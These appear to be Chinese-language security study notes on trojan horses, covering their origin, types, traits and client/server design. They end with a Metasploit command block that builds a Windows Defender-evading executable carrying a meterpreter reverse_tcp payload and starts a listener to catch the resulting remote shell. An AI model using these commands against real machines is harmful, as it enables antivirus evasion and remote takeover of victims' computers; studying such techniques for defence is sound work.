## 木马的由来
- 木马是“特洛伊木马”（trojan horse）的简称，据说这个名称来源于希腊神话《木马屠城记》。
- 如今黑客程序借用其名，有“一经潜入，后患无穷”之意。

## 木马的定义
- 在计算机系统中，“特洛伊木马”指系统中被植入的、人为设计的程序，目的包括通过网络远程控制其他用户的计算机系统，窃取信息资料，并可恶意致使计算机系统瘫痪。

## 木马的危害
- 根据传统的数据安全模型的分类，木马程序的企图可以对应分为三种：
  - 试图访问未授权资源
  - 试图阻止访问
  - 试图更改或破坏数据和系统

## 木马的分类
- 从木马所实现的功能角度可分为：
  - 破坏型
  - 密码发送型
  - 远程访问型
  - 键盘记录木马
  - DoS攻击木马
  - 代理木马
  - FTP木马
  - 程序杀手木马
  - 反弹端口型木马

## 木马的特点
- 一个典型的特洛伊木马（程序）通常具有以下四个特点：
  - 有效性
  - 隐 性
  - 顽固性
  - 易植入性

## 木马的特点
- 此外，木马还具有以下辅助型特点：
  - 自动运行
  - 欺骗性
  - 自动恢复
  - 功能的特殊性

## 木马实现原理
- 本质上说，木马大多都是网络客户/服务（Client/Server） 程序的组合。
- 常由一个攻击者控制的客户端程序和一个运行在被控计算机端的服务端程序组成。

- 当攻击者要利用“木马”进行网络入侵，一般都需完成如下环节：
  - 向目标主机植入木马
  - 启动和隐藏木马
  - 服务器端（目标主机）和客户端建立连接
  - 进行远程控


## 病毒木马分析网站
- https://www.virustotal.com/gui/



## 使用eavsion模块规避防火墙
```shell
search evasion
use evasion/windows/windows_defender_exe
show options		# 查看配置
set FILENAM [生成的文件名]
set payload windows/meterpreter/reverse_tcp		# 设置payload，也就是攻击载荷
set LHOST [MSF主机上的IP地址]
set LPORT [MSF主机上的端口号]
run

use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp		# 设置payload，也就是攻击载荷
set LHOST [MSF主机上的IP地址]
set LPORT [MSF主机上的端口号]
run		
```